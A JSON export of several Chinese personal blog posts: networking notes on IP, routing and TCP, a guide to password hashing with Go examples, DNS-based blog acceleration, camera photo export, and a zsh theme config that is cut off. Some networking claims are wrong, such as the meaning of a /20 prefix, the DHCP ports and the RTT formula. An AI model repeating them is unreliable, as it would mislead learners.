[{"title":"计算机网络简明教程","url":"%2Fp%2F57254ff8.html","content":"\n> # 网络层\n\n# 1. MAC地址\n\n是对网络上各接口的唯一标识, 注意而不是设备的唯一标识\n\n因为普通电脑就有线网卡和无线网卡, 交换机和路由器更是有多个 mac 地址\n<!-- more -->\n\n\n+ 单播 mac 地址  就是查看自己是否匹配, 匹配接受\n\n+ 广播 mac 地址  FF-FF-FF-FF-FF-FF, 接受\n\n+ 多播 mac 地址 看自己的是否在这个多播租, 在的话接受\n\n\n\n# 2. IP 地址\n\n在数据包的转发过程中, 源 ip地址和目的 ip 地址不变, 源 mac 地址和目的 mac 地址一直变\n\n\n\n# 3. ARP协议\n\n每个主机有自己的 arp 缓存表,  不知道别人的就需要发送 arp 报文\n\narp 缓存表有类型, 静态和动态,  一般是动态, 两分钟失效, 因为有可能你换 ip\n\narp 只能在同一个网络中使用, 不能跨网络询问\n\n\n\n# 4. 集线器和交换机\n\n集线器给以太网每个设备发送(物理层)\n\n交换机给目的主机发送(数据链路层,也包括物理层)\n\n\n\n集线器和交换机组成的网络属于同一个广播域,就是广播的都能收到\n\n交换机通过自学习的方法, 记录主机 mac 地址所对应的接口号\n\n\n\n为了以太网稳定, 一般冗余交换机线路连接, 但是有可能发生广播风暴(环), 可以通过生成树协议STP ,避免环路(最小生成树)\n\n\n\n# 5. VALN\n\n一个或多个交换机,不同的接口划分成多个 VLAN\n\n通过 VLAN缩小广播域, 还可以用路由器隔离广播域\n\n交换机接口类型: Access, Trunk, Hybrid(华为)\n\nVLAN 设置, 和主机连接的交换机用 ACCESS端口, 交换机互联的端口用 Trunk 端口\n\n\n\n# 6. IPV4\n\n### 6.1 分类编址\n\n网络号+主机号 4个字节32位\n\nA 类 0-127    网络号1个字节\n\nB 类 128-191  网络号2个字节\n\nC 类 192-223 网络号3个字节\n\nD 类  多播地址\n\nE 类  保留使用\n\n### 6.2 划分子网\n\n从主机号借用一部分给子网号,  有种从B类降级到C类的感觉\n\n子网掩码, 前面1代表网络号, 0代表主机号, 然后逻辑与运算, 得到子网的网络地址(网络起始的地址,xxx.xxx.xxx.0)\n\nC 类地址默认子网掩码就是255.255.255.0\n\n### 6.3 无分类编址\n\n忘记前两种方法\n\n128.14.35.7/20 表明20个是主机号\n\n\n\n![1](计算机网络简明教程/1.png)\n\n\n\n根据无分类, 路由选择最长前缀匹配, 认为越长,路由更具体\n\n\n\n# 7. IP数据报\n\n给别人发数据报, 先看自己和别人的网络地址是否一样, 不一样就不在一个网络, 要发给默认网关\n\n默认网关: 指定的转发路由器的 IP 地址\n\n到达路由器时, 检查路由条目, 匹配到正确的网络地址后转发\n\n路由器不转发广播地址\n\n\n\n### 7.1 路由表\n\n默认路由 0.0.0.0/0, \t\t\t\t 网络前缀最短,最模糊, 选择优先级最低\n\n特定路由 198.168.1.2/32        网络前缀最长,最具体, 选择优先级最高\n\n\n\n因为有默认路由的存在(少了路由条目发给默认路由, 不存在的网络也给默认路由), 容易发生路由环路的问题, 所以 IP 数据报有 TTL , 变成0了就丢弃\n\n\n\n### 7.2 路由选择协议\n\n一个网络,组成自治系统 AS\n\n两个AS 之间用外部网关协议 EGP\n\nAS内部用内部网关协议 IGP\n\n![1](计算机网络简明教程/2.png)\n\n\n\n##### 7.2.1 RIP 内部网关,UDP\n\n经过一个路由+1, 认为越短的路由就是好的路由, 跳数大于15,表明不可达\n\n如果距离一样, 可以负载均衡\n\n\n\n路由器仅和相邻路由器周期交换路由信息\n\n![1](计算机网络简明教程/3.png)\n\n\n\n##### 7.2.2 OSPF 内部网关,IP\n\n克服 RIP 缺点,1989年开发出\n\n路由器之间有代价, 采用最短路径算法(迪杰斯特拉)\n\n\n\n##### 7.2.3 BGP 外部网关,tcp\n\n只是能找到到达的比较好路由, 不是最佳路由\n\n不同的 AS自治系统发言人建立 tcp 连接,交流信息\n\n\n\n# 8. ipv4首部格式\n\n固定20字节+ 40字节可变部分\n\n### 8.1 固定20字节\n\n+ 版本4bit + 首部长度(4字节的整数倍) 4bit +区分服务 8bit + 总长度(首部+数据) 16bit \n+  标识 标志 片偏移   三个用于 ip数据报分片\n+ 生存时间TTL(以跳数对单位)协议8bit +   协议8bit(1 icmp 2 igmp 6tcp 17udp 41ipv6 89 ospf) + 首部检验和16bit(检测首部是否出错, ipv6不再检验)\n+ 源 IP地址  32bit\n+ 目的 IP地址 32bit\n\n\n\n### 8.2 IP数据报分片\n\n以太网数据载荷部分最大1500字节的限制(MTU), IP数据报太大的话, 需要分片发送\n\n![1](计算机网络简明教程/4.png)\n\n\n\n# 9. ICMP网际控制报文协议\n\n封装在 IP 数据报中发送, 向源点报错  和 向其他主机询问\n\n+ 差错报告报文\n  + 终点不可打\n  + 源点抑制\n  + 时间超过\n  + 参数问题\n  + 改变路由\n\n+ 询问报文\n  + 回送请求和回答 \n    + ping 命令, 不通过 tcp 和 udp  \n    +  tracert 命令, 用来看经过哪些路由器\n  + 时间戳请求和回答\n\n\n\n# 10. 虚拟专用网vpn和 网络地址转换NAT\n\n### 10.1 私有地址\n\n+ 10.0.0.0/8\n+ 172.16.0.0/12\n+ 192.168.0.0/16\n\n### 10.2 不同局域网间的发送\n\n+ 路由器不转发私有地址\n\n+ 所以对内部 IP数据报, 进行加密, 再次套一个首部, 写上公网地址\n+ 又叫 IP 隧道技术\n\n### 10.3 NAT\n\n+ 路由器上安装 NAT 软件\n+ 到路由器的时候,转换全球地址, 记录在路由器的 NAT转换表里\n+ NAPT路由器, 将端口号和 IP 地址一起转换\n+ NAT, 外网不能主动发起到内网的主机, 内网主机不能充当服务器, 如果可以,就要特殊穿透技术\n\n> # 运输层\n\n# 11. 运输层\n\n### 11.1 端口号  0-65535\n\n+ 熟知端口号 0-1023 个人不能用\n+ 登记端口号 1024-49151 也得IANA登记\n+ 短暂端口号 49152-65535 \n\n### 11.2 发送复用和接收分用\n\n![1](计算机网络简明教程/5.png)\n\n\n\n> # 数据链路层\n\n# 12. 数据链路层\n\n#### 12.1 封装成帧\n\n添加帧头, 添加帧尾来标志\n\n如果数据里面有帧的定界标志, 就对数据进行一个转义, 否则会认为错误的结束位置\n\n帧的最大数据长度有限制, 叫做 MTU\n\n#### 12.2 差错检测\n\n![1](计算机网络简明教程/6.png)\n\n\n\n+ 奇偶校验\n  + 在数据后面添加1位奇偶校验位, 使1的个数为奇数或偶数\n  + 不靠谱, 一半的失误率\n\n+ CRC 校验\n\n  ![1](计算机网络简明教程/7.png)\n\n  ![1](计算机网络简明教程/8.png)\n\n#### 12.3 可靠传输\n\n+ 一般链路层在有线以太网不实现可靠传输, 无线局域网信号差, 实现可靠传输\n\n+ 停止等待协议SW\n\n  + 信道利用率特别低\n\n    ![1](计算机网络简明教程/9.png)\n\n\n+ 回退 N 帧协议GBN \n\n  + 通过发送窗口发送, 累计确认增大效率\n  + 但是发送5个, 第1个出错, 会连累剩下的4个, 造成5个都需要重传, 差的情况下效率也不高\n  + 接收窗口只能是1\n\n\n+ 选择重传协议SR\n\n  + 接收窗口大于1, 有了缓存\n  + 不能累计确认,只能逐一确认\n\n\n\n# 13 数据链路层协议\n\n#### 13.1 点对点协议 PPP\n\n不提供可靠传输服务\n\n\n\n> # 应用层\n\n# 20. DHCP \n\ndhcp 服务端口udp 68,  客户端 udp 67\n\ndhcp 服务器, 一般集成在路由器里\n\n客户通过 dhcp 客户端向 dhcp 服务器请求, 得到 IP租用, 时间过了一半后,重新发送租用请求\n\n在使用的时候需要用 arp 请求确定 ip 未被占用","tags":["网络"],"categories":["网络"]},{"title":"如何正确存储密码","url":"%2Fp%2F4fe35076.html","content":"\n\n\n# 1. 哈希还是加密?\n\n哈希（Hash）是将目标文本转换成具有相同长度的、不可逆的杂凑字符串（或叫做消息摘要）而加密（Encrypt）是将目标文本转换成具有不同长度的、可逆的密文。\n\n哈希算法往往被设计成生成具有相同长度的文本，而加密算法生成的文本长度与明文本身的长度有关。哈希算法是不可逆的，而加密算法是可逆的。\n\n<!-- more -->\n\n哈希函数并不是专门用来设计存储用户密码的,不论如何，使用 MD5、MD5 加盐或者其他哈希的方式来存储密码都是不安全的.\n\n使用加密的方式存储密码相比于哈希加盐的方式，在一些安全意识和能力较差的公司和网站反而更容易导致密码的泄露和安全事故。\n\n\n\n哈希加盐的方式确实能够增加攻击者的成本，但是今天来看还远远不够，我们需要一种更加安全的方式来存储用户的密码，这也就是今天被广泛使用的慢哈希算法. \n\n慢哈希算法是为哈希密码而专门设计的，所以它是一个执行相对较慢的算法, 自己计算起来都慢, 那么破解起来也会非常慢.\n\n\n\n# 2. 破解哈希\n\n+ 暴力枚举法：简单粗暴地枚举出所有原文，并计算出它们的哈希值，看看哪个哈希值和给定的信息摘要一致。\n\n+ 字典法：黑客利用一个巨大的字典，存储尽可能多的原文和对应的哈希值。破解时通过密文直接反查明文。但存储一个这样的数据库，空间成本是惊人的。\n\n+ 彩虹表（rainbow）法：在字典法的基础上改进，以时间换空间。是现在破解哈希常用的办法。\n\n  \n\n  虽然彩虹表有着如此惊人的破解效率，但网站的安全人员仍然有办法防御彩虹表。最有效的方法就是“加盐”，即在密码的特定位置插入特定的字符串，这个特定字符串就是“盐（Salt）”，加盐后的密码经过哈希加密得到的哈希串与加盐前的哈希串完全不同，黑客用彩虹表得到的密码根本就不是真正的密码。即使黑客知道了“盐”的内容、加盐的位置，还需要对H函数和R函数进行修改，彩虹表也需要重新生成，因此加盐能大大增加利用彩虹表攻击的难度。\n  \n\n\n\n# 3. Bcrypt加密\n\nBcrypt内部自己实现了随机加盐处理。使用Bcrypt，每次加密后的密文是不一样的。对一个密码，Bcrypt每次生成的hash都不一样，那么它是如何进行校验的？\n\n虽然对同一个密码，每次生成的hash不一样，但是hash中包含了salt（hash产生过程：先随机生成salt，salt跟password进行hash）；\n\n在下次校验时，从hash中取出salt，salt跟password进行hash；得到的结果跟保存在DB中的hash进行比对。\n\n举个栗子，假如一个密文是 `$2a$10$vI8aWBnW3fID.ZQ4/zo1G.q1lRps.9cGLcZEiGDMVr5yUP1KUOYTa`, 那么通过 `$` 分隔符我们可以得到下面三个信息:\n\n1. `2a` 表示的是用于此次计算的 bcrypt 算法版本；\n2. `10` 表示的是 `log_rounds` 值；\n3. `vI8aWBnW3fID.ZQ4/zo1G.q1lRps.9cGLcZEiGDMVr5yUP1KUOYTa` 是 salt 和加密文本的拼接值 (经过了 base 64 编码，前面 22 个字母是 salt 的十六进制值。\n\n\n\n# 4. PBKDF2，Scrypt，Bcrypt 和 ARGON2对比\n\n+ PBKDF2\n\nPBKDF2 被设计的很简单，它的基本原理是通过一个伪随机函数（例如 HMAC 函数），把明文和一个盐值作为输入参数，然后按照设置的计算强度因子重复进行运算，并最终产生密钥。\n\n这样的重复 hash 已经被认为足够安全，但也有人提出了不同意见，此类算法对于传统的 CPU 来说的确是足够安全，使用GPU阵列、或FPGA来破解PBKDF2仍相对容易。注意这里说的是相对，为了比较接下来提到的另外两种算法。\n\n+ BCrypt\n\nBCrypt 在1999年发明，由于使用GPU、FPGA的破解是基于它们相对于CPU的并行计算优势，因此BCrypt算法不仅设计为CPU运算密集，而且是内存IO密集。\n\n然而随着时间迁移，目前新的FPGA已经集成了很大的RAM（类型CPU缓存、大约几十兆），解决了内存密集IO的问题。\n\n+ Scrypt\n\nScrypt 于2009年产生，弥补了BCrypt的不足。它将CPU计算与内存使用开销提升了一个层次，不仅CPU运算需要指数时间开销，还需要指数内存IO开销。\n\n+ Argon2\n\nArgon2 有两个主要的版本：**Argon2i** 是对抗侧信道攻击的最安全选择，而 **Argon2d** 是抵抗 GPU 破解攻击的最安全选择。\n\n在 2019 年，我建议你以后不要使用PBKDF2 或 BCrypt，并强烈建议将 Argon2（最好是 **Argon2id**）用于最新系统。\n\nScrypt 是当 Argon2 不可用时的不二选择，但要记住，它在侧侧信道泄露方面也存在相同的问题。\n\n  \n\n# 5. 代码实现\n\n+ pbkdf2 不推荐\n\n  ```go\n  package main\n  \n  import (\n  \t\"crypto/sha256\"\n  \t\"fmt\"\n  \n  \t\"golang.org/x/crypto/pbkdf2\"\n  )\n  \n  func main() {\n  \n  \tpasswd := \"levonfly\"\n  \tsalt := \"salt\"\n  \n  \tres1 := pbkdf2.Key([]byte(passwd), []byte(salt), 10, 20, sha256.New)\n  \tfmt.Println(string(res1)) //'J!85|LU@\n  \n  \t// 加密后一样\n  \tres2 := pbkdf2.Key([]byte(passwd), []byte(salt), 10, 20, sha256.New)\n  \tfmt.Println(string(res2)) //'J!85|LU@\n  \n  }\n  ```\n\n  \n\n+ bcrypt 推荐\n\n  ```go\n  package main\n  \n  import (\n  \t\"fmt\"\n  \n  \t\"golang.org/x/crypto/bcrypt\"\n  )\n  \n  func main() {\n  \n  \tpasswd := \"levonfly\"\n  \t\n    // cost默认是10,不要太小\n  \tres1, _ := bcrypt.GenerateFromPassword([]byte(passwd), 10)\n  \tfmt.Println(string(res1)) //$2a$10$Y85p96ZRD1Sa5iU7M/ngku9MIFNkmAwEI38FvPT9dj628E8hPOU0K\n  \n  \t// 加密结果不一样\n  \tres2, _ := bcrypt.GenerateFromPassword([]byte(passwd), 10)\n  \tfmt.Println(string(res2)) //$2a$10$7xUWgmWB3te5OipBYx4aheUFz7dCcj7JLIpQW6D/Me1R4qljEIFy2\n  \n  \terr1 := bcrypt.CompareHashAndPassword(res1, []byte(passwd))\n  \tfmt.Println(err1) //nil\n  \n  \terr2 := bcrypt.CompareHashAndPassword(res1, []byte(\"random\"))\n  \tfmt.Println(err2) //crypto/bcrypt: hashedPassword is not the hash of the given password\n  }\n  ```\n\n+ scrypt 推荐\n\n  ```go\n  package main\n  \n  import (\n  \t\"fmt\"\n  \n  \t\"golang.org/x/crypto/scrypt\"\n  )\n  \n  func main() {\n  \n  \tpasswd := \"levonfly\"\n  \tsalt := []byte{0xc8, 0x28, 0xf2, 0x58, 0xa7, 0x6a, 0xad, 0x7b}\n  \n  \tres1, _ := scrypt.Key([]byte(passwd), salt, 1<<15, 8, 1, 32)\n  \tfmt.Println(string(res1)) //TCoi[DRt;IALuw}\n  \n  \tres2, _ := scrypt.Key([]byte(passwd), salt, 1<<15, 8, 1, 32)\n  \tfmt.Println(string(res2)) //TCoi[DRt;IALuw}\n  }\n  ```\n\n  \n\n+ argon2 推荐\n\n  ```go\n  package main\n  \n  import (\n  \t\"encoding/base64\"\n  \t\"fmt\"\n  \n  \t\"golang.org/x/crypto/argon2\"\n  )\n  \n  func main() {\n  \n  \tpasswd := \"levonfly\"\n  \tsalt := \"salt\"\n  \n  \tres1 := argon2.IDKey([]byte(passwd), []byte(salt), 3, 32, 4, 32)\n  \tfmt.Println(base64.StdEncoding.EncodeToString(res1)) //uEZgAbCSfDyd8VAMbcmSSZKpH/TQ9hh9VsblPFGuDjM\n  \n  \tres2 := argon2.IDKey([]byte(passwd), []byte(salt), 3, 32, 4, 32)\n  \tfmt.Println(base64.StdEncoding.EncodeToString(res2)) //uEZgAbCSfDyd8VAMbcmSSZKpH/TQ9hh9VsblPFGuDjM\n  }\n  ```\n\n\n\n\n# 6. 数据库存储\n\n如果存储慢哈希的密码, 一般都是存储定长的. 如`char(60)`\n\n参考: https://stackoverflow.com/questions/247304/what-data-type-to-use-for-hashed-password-field-and-what-length/\n\n\n\n# 7. 参考资料\n\n+  https://draveness.me/whys-the-design-password-with-md5/\n\n+ https://github.com/luokuning/blogs/issues/9\n\n+ https://juejin.im/post/5e70c152518825491949886e\n\n+ https://www.jianshu.com/p/732d9d960411","tags":["密码"],"categories":["计算机基础"]},{"title":"加速博客访问国内外访问分流","url":"%2Fp%2F5ee5b7c.html","content":"\n\n\n不只一个人说过,我博客访问的速度真慢. 博客一直是简单记录自己的个人历程, 一直懒得加速. \n\n今天终于有时间折腾下, 让网站在国内和国外各备份一份,然后国内的用户访问国内的coding,国外的用户访问国外的github.\n\n<!-- more -->\n\n### 1. 国内使用coding加速\n\n+ 登录网站, https://wwww.coding.net/, 注册登录\n\n+ 创建项目时候选择DevOps项目, 此处用的自己的用户名`levonfly`, 仓库地址为`git@e.coding.net:levonfly/levonfly.git`\n\n+ 在个人设置里, 配置公钥\n\n+ `ssh -T git@e.coding.net -i ~/.ssh/github-unix2dos`  测试密钥是否能访问\n\n+ 修hexo配置文件\n\n  ```yaml\n  deploy:\n      -\n       type: git\n       repo:\n          github: git@unix2dos:unix2dos/unix2dos.github.io.git # github地址\n          coding: git@e.coding.net:levonfly/levonfly.git #coding地址\n       branch: master\n  ```\n\n+ 修改ssh配置文件\n\n  ```yaml\n  Host coding e.coding.net\n  \tHostName e.coding.net\n  \tIdentityFile ~/.ssh/github-unix2dos # 自己的私钥\n  \tUser levonfly\n  ```\n\n+ 个人设置->实名认证\n\n+ 项目->持续部署->静态网站->发布网站->立即部署\n\n+ DNS解析 \n\n  CNAME->默认指向coding-pages.com\n\n  CNMA->境外指向github.io\n\n  我的域名`liuvv.com`解析如下\n\n  ```bash\n  主机 类型\t 线路\t 记录值\n  www\tCNAME\t境外\tunix2dos.github.io\n  www\tCNAME\t默认\tr8ea0k.coding-pages.com\n  ```\n\n  \n\n+ 证书申请失败\n\n  申请错误原因是：在验证域名所有权时会定位到 Github Pages 的主机上导致 SSL 证书申请失败\n\n  正确的做法是：先去域名 DNS 把 GitHub 的解析暂停掉，然后再重新申请 SSL 证书，大约十秒左右就能申请成功，然后开启强制 HTTPS 访问\n\n  \n\n+ 测试\n\n  ```bash\n  host www.liuvv.com   # 国内测试\n  www.liuvv.com is an alias for r8ea0k.coding-pages.com.\n  r8ea0k.coding-pages.com has address 150.109.4.162\n  r8ea0k.coding-pages.com has address 119.28.218.218\n  \n  \n  host www.liuvv.com  # 国外服务器测试\n  www.liuvv.com is an alias for unix2dos.github.io.\n  unix2dos.github.io has address 185.199.109.153\n  unix2dos.github.io has address 185.199.111.153\n  unix2dos.github.io has address 185.199.108.153\n  unix2dos.github.io has address 185.199.110.153\n  ```\n\n  \n\n  另外可开启和关闭vpn, 刷新博客, 看证书的有效期也能看到区别, 国内外访问同一个地址, 实现了分流. 至此加速大功告成.\n\n\n\n### 2. 其他方案\n\n还有一种方案是把生成的静态文件放在国内的CDN上, 来进行加速\n\n可参考https://github.com/saltbo/uptoc\n\n\n\n### 3. 参考资料\n\n+ https://www.cnblogs.com/sunhang32/p/11969964.html \n+ https://github.com/saltbo/uptoc\n\n","tags":["blog"],"categories":["个人记录"]},{"title":"sony相机照片导出操作","url":"%2Fp%2Fe672b089.html","content":"\n\n\n### 1. 照片导出到手机上(方便快速使用和修改)\n\n1. sony 相机-> 第三项 -> 发送到智能手机 -> 在智能手机上选择 -> 出现了 wifi\n2. 手机连接sony 相机的 wifi\n3. 手机->Imaging Edge Mobile->连接装置->查看照片\n\n<!-- more -->\n\n### 2. 照片导出到 macbook\n\n硬盘太小放弃\n\n\n\n### 3. 照片导出到 windows\n\n1. 用数据线连接\n\n2. 出现U盘, DCIM文件夹内, 是照片, 直接剪切出来\n\n3. 视频是在PRIVATE文件夹内\n","tags":["摄影"],"categories":["摄影"]},{"title":"udp和tcp介绍和tcp建立连接过程","url":"%2Fp%2F289c4599.html","content":"\n# 1. udp 和 tcp 的区别\n\n### 1.1 数据传输\n\nUDP \n\n+ 数据传输\n\nTCP \n\n+ 3报文握手+数据传输+4报文挥手\n\n<!-- more -->\n\n### 1.2  连接方式\n\nUDP \n\n+  单播(一对一), 多播(一对多), 广播 (一对全)\n\nTCP \n\n+  单播(一对一)\n\n### 1.3 应用报文\n\nUDP\n\n+ 每个报文添加个UDP首部\n\nTCP\n\n+ 一系列字节流放到缓存中, 通过滑动窗口策略发送\n+ 发送方加个 TCP 头部\n+ 接收方取出字节流,组合送给接收方进程\n\n![1](udp和tcp介绍和建立连接/1.png)\n\n### 1.4 首部\n\nUDP\n\n+ 8字节\n\nTCP\n\n+ 最小20字节, 最大60字节\n\n\n\n# 2. tcp连接\n\n![1](udp和tcp介绍和建立连接/2.png)\n\n![1](udp和tcp介绍和建立连接/3.png)\n\n\n\n### 2.1 tcp客户端\n\n##### 建立\n\n+ closed 关闭\n+ 创建传输控制快\n+ 握手①SYN=1 seq=x  进入**SYN-SENT**(同步已发送状态)\n+ 握手③ACK=1 seq=x+1 ack=y+1 进入 **ESTABLISHED**(连接已建立状态)\n+ 数据传输\n\n\n\n##### 释放\n\n+ 挥手① FIN=1 ACK=1 seq=u  ack=v 进入 **FIN_WAIT_1**(终止等待1状态)\n+ 收到挥手②进入 **FIN_WAIT_2**(终止等待2状态)\n+ 接受数据\n+ 挥手④ ACK=1 seq=u+1 ack=w+1 进入 **TIME_WAIT**(时间等待状态)\n+ 经过2MSL后, 进入 **CLOSED**(关闭状态)\n\n\n\n### 2.2 TCP服务器\n\n##### 建立\n\n+ closed 关闭\n+ 创建传输控制快\n  + tcp 连接表\n  + 指向发送和接收缓存的指针\n  + 指向重传队列的指针\n  + 当前的发送和接收序号\n+ listen 监听\n+ 握手② SYN=1 ACK=1 seq=y ack=x+1  进入**SYN-REVD**(同步已接收状态)\n+ 进入**ESTABLISHED**(连接已建立状态)\n+ 数据传输\n\n##### 释放\n\n+ 挥手② ACK=1 seq=v ack=u+1 并进入**CLOSE_WAIT**(关闭等待状态)\n+ 通知应用进程断开连接, 客户端到服务器方向连接关闭, 属于半关闭状态\n+ 发送数据\n+ 挥手③ FIN=1 ACK=1 seq=w ack=u+1 进入 **LAST-ACK**(最后确认状态)\n+ 收到挥手④后进入 **CLOSED**(关闭状态)\n\n\n\n# 3. tcp 连接问题\n\n### 3.1 为什么不用两次握手\n\n+ 假如第一个连接发送失败, 重传了以后, 过了好久好久以后, 失败的到达了,  服务器又建立了一次请求, 但客户端处于关闭无法理会, 服务器就无法释放这个连接.\n\n\n\n### 3.2 CLOSE_WAIT 和 TIME_WAIT\n\n+ CLOSE_WAIT \n  + 服务器状态(关闭等待状态 )\n  + 发送确认挥手②以后\n+ TIME_WAIT \n  + 客户端状态(时间等待状态)\n  + 发送确认挥手④以后, 再等待2个2MSL\n\n\n\n### 3.3 为什么进入 TIME_WAIT 而不是直接关闭\n\n因为发送挥手④的时候, 有可能失败\n\n如果客户端直接关闭, 服务器重发挥手③, 客户端处于关闭不响应, 服务器无法释放资源\n\n\n\n### 3.4 保活计时器的作用\n\n假如建立连接后, 客户端出现了故障\n\n+ 服务器每次收到请求后, 重新启动定时器(2小时)\n+ 服务器2小时后没收到客户端请求, 发送探测报文段\n+ 服务器75秒间隔发送一个, 达到10个无响应,关闭连接\n\n\n\n# 4. tcp 头部字段\n\n### 4.1 头部格式\n\n20字节固定  + 最大40字节扩展\n\n### 4.2 固定20字节详情\n\n- [x] 源端口 2字节,  目的端口 2字节\n\n- [x] 序号 4字节 , 我发送的是以 n 开始的序号\n\n- [x] 确认号 4字节, 之前的都已经接收,下次希望给我传递 n,  ACK位置必须=1\n\n- [x] 数据偏移(说明头部字节是20还是到60) + 保留 + URG(紧急指针有效) + ACK + PSH(推送,尽快交给应用层) + RST(复位,重新建立连接) + SYN(tcp建立标志) + FIN(tcp释放标志) 一共2字节,     窗口2字节, 我的接收窗口大小 (例如rwnd=20)\n\n- [x] 检验和2字节(检错算法),  紧急指针2字节(帮忙取出紧急数据)\n\n\n\n### 4.3 扩展字段\n\n![1](udp和tcp介绍和建立连接/4.png)\n","tags":["tcp"],"categories":["网络"]},{"title":"tcp滑动窗口,拥塞控制和超时重传时间选择","url":"%2Fp%2F7eb83068.html","content":"\n\n\n# 1. 流量控制-滑动窗口\n\n\n\n![1](tcp滑动窗口和拥塞控制/1.png)\n\n<!-- more -->\n\n### 1.0 前提\n\nA->B\n\nA 是发送方, B 是接收方,  各自有自己的滑动窗口\n\n\n\n### 1.1  B告诉A的窗口大小\n\nrwnd=20  我的窗口20个\n\nack=31  下一次给老子发31\n\n\n\n### 1.2  A的窗口移动\n\n+  尾部\n  + 往前移动\n  + 不动, 因为在等待 ACK \n\n+ 头部\n  + 往前移动\n  + 不动, 等待\n  + 向后收缩, B 端的窗口变小了,(不建议这么做)\n\n\n\n### 1.3 A窗口内三个指针\n\n+ P1 已经发送的位置, 未收取到 ACK\n+ P2 准备发送的位置\n+ P3 尾部\n\n\n\n### 1.4  B的窗口状态\n\n+ B 窗口内,  数据未按序到达, 只能现在缓存中,  因为B 只能按正确顺序发送ACK\n+ 如果 A 一只没有收到 ACK,还有超时重传机制\n\n![1](tcp滑动窗口和拥塞控制/2.png)\n\n### 1.5 总结\n\n+ A的窗口大小不一定和 B 说的一样\n  + 传说窗口值有时间滞后\n  + 网络拥塞情况\n\n+ B 的不按时序达到的数据如何处理, tcp 没有规定\n  + 直接丢弃, 简单, 效率差\n  + 缓存在窗口内, 等到收到连续了后, 再 ACK\n\n+ 为了增加效率,  tcp 要求接收方 B \n  + 累计确认, 多个一起确认\n  + 捎带确认. 发数据顺便确认, 不经常发生\n  + 不能太晚确认, 要不然 A 就超时重传\n\n+ 全双工通信\n  + 其实A和B都有发送窗口和接收窗口\n\n\n\n##### 1.6. 0窗口检测报文\n\n+ 没有缓存了, 也必须要接收检测或紧急报文\n\n![1](tcp滑动窗口和拥塞控制/4.png)\n\n\n\n# 2. 拥塞机制(通过算法调整拥塞窗口)\n\n出现拥塞不控制,吞吐量下降,  类似堵车\n\n\n\n### 2.0 前提\n\n数据发送 A->B, B 有足够大的窗口, A 的窗口根据拥塞调节 \n\n+ TCP 发送方的发送窗口 = min(自身拥塞窗口, TCP接收方的接收窗口)\n\n+ 接收窗口 rwnd (receive window)\n\n+ 发送窗口swnd(send window)\n\n+ 拥塞窗口cwnd(congestion window)\n\n  \n\n### 2.1 A的拥塞窗口大小(cwnd)\n\n+ 没有拥塞,增大, 有缩小\n+ 判断拥塞依据, 没有收到 B 的 ACK, 自己会重传\n+ 将拥塞窗口(cwnd) =发送窗口(swnd)\n\n+ 慢开始变量 ssthresh\n  + cwnd < ssthresh 慢开始算法\n  + cwnd >  ssthresh 拥塞避免算法\n  + cwnd =  ssthresh  两个算法都可以\n\n\n\n### 2.2 窗口变量的变化\n\ncwnd=1\n\nswnd=cwnd\n\nssthresh=16\n\n\n\n+ 慢开始算法开始  每次收到 ack, 就+1,  然后 +2,  + 4,  + 8 , 有种指数增长概念\n\n+ 到了16, 变成拥塞避免算法, 每次+1, 收到后再+1\n+ 出现了丢包情况,认为拥塞\n  + 将cwnd=1\n  + 将ssthresh=cwnd/2, 这个时候你开始拥塞了, 我取的一半好了\n+ 慢开始算法继续开始\n\n\n\n### 2.3 快重传算法\n\n有时候丢包, 是网络问题,并不是拥塞,但是你认为拥塞,  直接让窗口变1了怎么办?\n\n+ 启用快重传机制\n+ B 直接给 A发送3个重复确认\n+ 发送方 A 收到了3个重复确认, 说明不是拥塞, 不用慢开始算法, 执行快恢复算法\n\n\n\n### 2.4 拥塞控制四个算法\n\n+ 慢开始, 指数增加\n\n  + 发送的报文少, 不是拥塞窗口增长满\n\n+ 拥塞避免, 每次+1\n\n  + 不是避免拥塞, 是线性增长, 试试啥时候拥塞\n\n+ 快重传\n\n  B 数据未按序到达, 就一直发送想要的序号, 一直提醒 A, 让提早重传\n\n  + B要求 A 你快重传, 不要等计时器到了\n  + B立即发送确认, 如果不是正确顺序到达, 就发送之前正确顺序的重复确认(为了提醒 A)\n  + A 收到了3个连续的重复确认, 就应该立即重传\n\n+ 快恢复\n\n  + 将ssthresh和 cwnd都调整为当前窗口的一半,  他俩相等了再执行拥塞避免算法\n\n\n\n![1](tcp滑动窗口和拥塞控制/3.png)\n\n\n\n\n\n# 3. 超时重传时间的选择\n\n+ RTT往返时间 = 开始发送时间 -  收到时间\n\n+ RTO超时时间, 要略大于 RTT 时间\n\n\n\n![1](tcp滑动窗口和拥塞控制/5.png)\n\n\n\n随着环境的不一样, RTT样本差别大, 要计算加权平均\n\n但是如果重传了,由于分不清是对那个的回应, 就不计算了, 还是用以前的RTO*2\n\n![1](tcp滑动窗口和拥塞控制/6.png)","tags":["tcp"],"categories":["网络"]},{"title":"Zsh主题Powerlevel9k升级到Powerlevel10k","url":"%2Fp%2F4fd520f9.html","content":"\n\n\n为什么升级？Powerlevel9k项目不再维护，10更快更强大（10-100倍的性能提升）。\n\n并且完美兼容Powerlevel9k, 以前的配置参数可以不用任何修改.\n\n<!-- more -->\n\n### 1. 替换\n\n```bash\ngit clone --depth=1 https://github.com/romkatv/powerlevel10k.git $ZSH_CUSTOM/themes/powerlevel10k\n\n# Replace ZSH_THEME=\"powerlevel9k/powerlevel9k\" with ZSH_THEME=\"powerlevel10k/powerlevel10k\".\n```\n\n\n\n### 2. 配置\n\n可以通过 `p10k configure` 安装推荐字体. 也可以`p10k configure`进行傻瓜式主题配置. 不过还是建议自己定制.\n\n```\np10k configure\n```\n\n\n\n### 3. 我的配置\n\n```yaml\nPOWERLEVEL9K_MODE='nerdfont-complete'\nZSH_THEME=\"powerlevel10k/powerlevel10k\"\nPOWERLEVEL9K_CONTEXT_TEMPLATE='%n'\nPOWERLEVEL9K_CONTEXT_DEFAULT_FOREGROUND='white'\nPOWERLEVEL9K_PROMPT_ON_NEWLINE=true\nPOWERLEVEL9K_MULTILINE_LAST_PROMPT_PREFIX=\"%F{014}\\u2570%F{cyan}\\uF460%F{073}\\uF460%F{109}\\uF460%f \"\nPOWERLEVEL9K_SHORTEN_DIR_LENGTH=1\nPOWERLEVEL9K_NODE_VERSION_BACKGROUND=\"green\"\nPOWERLEVEL9K_NODE_VERSION_FOREGROUND=\"black\"\nPOWERLEVEL9K_GO_VERSION_BACKGROUND=\"red\"\nPOWERLEVEL9K_GO_VERSION_FOREGROUND=\"black\"\nPOWERLEVEL9K_LEFT_PROMPT_ELEMENTS=(os_icon context ssh dir 